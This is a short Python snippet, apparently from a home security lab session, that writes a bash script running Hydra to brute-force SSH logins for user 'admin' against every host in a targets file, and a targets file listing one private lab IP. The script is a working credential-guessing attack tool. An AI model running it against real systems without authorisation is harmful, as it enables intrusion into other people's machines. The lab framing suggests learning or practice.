# Update the bruteforce.sh script to use targets.txt for multiple hosts

updated_script = """#!/bin/bash
# My script to test brute-force SSH attacks on multiple targets using Hydra

WORDLIST="credentials.txt"
USER="admin"
TARGET_FILE="targets.txt"

if [[ ! -f "$TARGET_FILE" ]]; then
  echo "[!] targets.txt not found. Please create one with target IPs."
  exit 1
fi

while read TARGET; do
  if [[ -z "$TARGET" ]]; then
    continue
  fi

  echo "[*] Starting brute-force on $TARGET with user $USER..."
  hydra -l "$USER" -P "$WORDLIST" ssh://"$TARGET"
  echo ""
done < "$TARGET_FILE"
"""

targets_txt = "192.168.56.102\n"

# Save updated script and targets.txt
script_path = "/mnt/data/kaiz-cyber-labs/01-ssh-bruteforce/bruteforce.sh"
targets_path = "/mnt/data/kaiz-cyber-labs/01-ssh-bruteforce/targets.txt"

with open(script_path, "w") as f:
    f.write(updated_script)

with open(targets_path, "w") as f:
    f.write(targets_txt)

script_path, targets_path

